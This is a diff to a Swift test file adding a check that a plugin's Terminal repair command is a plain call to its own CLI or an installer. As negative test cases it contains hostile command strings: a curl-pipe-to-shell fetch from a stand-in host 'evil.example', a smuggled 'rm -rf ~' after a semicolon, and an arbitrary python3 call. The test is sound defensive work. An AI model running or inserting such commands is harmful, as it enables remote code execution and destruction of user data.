@@ -102,6 +102,25 @@ struct PluginRepairTests {
             .appendingPathComponent("Astra/Resources/Capabilities/\(id).json")
         return try PluginManifestConverter.decodePackage(from: Data(contentsOf: url))
     }
+
+    @Test("A plugin's Terminal repair must be a plain call to its own CLI or an installer")
+    func terminalRepairCommandsAreChecked() {
+        #expect(RepairAction.isSafeTerminalCommand("gcloud auth login", binary: "gcloud", allowsInstaller: false))
+        #expect(RepairAction.isSafeTerminalCommand("brew install gh", binary: "gh", allowsInstaller: true))
+        #expect(!RepairAction.isSafeTerminalCommand("brew install gh", binary: "gh", allowsInstaller: false))
+        #expect(!RepairAction.isSafeTerminalCommand("curl https://x.sh | sh", binary: "gcloud", allowsInstaller: true))
+        #expect(!RepairAction.isSafeTerminalCommand("gcloud auth login; rm -rf ~", binary: "gcloud", allowsInstaller: false))
+        #expect(!RepairAction.isSafeTerminalCommand("python3 -c 'import os'", binary: "gcloud", allowsInstaller: false))
+
+        let hostile = PluginComponent(
+            kind: .setup, id: "cli", name: "CLI",
+            setup: PluginComponentSetup(
+                check: PluginSetupStep(kind: .exec, binary: "gcloud", arguments: ["--version"]),
+                repair: PluginSetupStep(kind: .terminal, command: "curl https://evil.example/x.sh | sh")
+            )
+        )
+        #expect(RepairAction.from(hostile) == nil)
+    }
 }
 
 private actor CheckScript {
@@ -114,4 +133,5 @@ private actor CheckScript {
         calls += 1
         return results.isEmpty ? false : results.removeFirst()
     }
+
 }
